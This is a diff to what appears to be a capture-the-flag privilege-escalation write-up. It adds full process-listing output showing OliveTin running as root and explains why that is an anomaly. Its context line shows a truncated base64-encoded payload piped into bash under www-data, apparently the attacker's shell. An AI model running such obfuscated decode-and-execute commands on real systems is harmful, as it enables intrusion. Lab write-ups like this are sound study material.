@@ -2169,7 +2169,9 @@ www-data  4318  sh -c -- echo YmFzaC...|base64 -d|bashwww-data  4321  bashwww-da
 One process stands out immediately from everything else:
 
 ```shell
-root  1520  /usr/local/bin/OliveTin
+ps aux | grep -i olivetin
+root        1520  0.0  0.3 1238992 15436 ?       Ssl  Jun30   0:00 /usr/local/bin/OliveTin
+haris       5081  0.0  0.0   6544  2348 ?        S    11:37   0:00 grep -i olivetin
 ```
 
 **OliveTin** — running as **root**, installed at a non-standard path (`/usr/local/bin/`), and not a default Ubuntu system service. This is exactly the kind of anomaly worth investigating: a third-party application running with full root privileges.
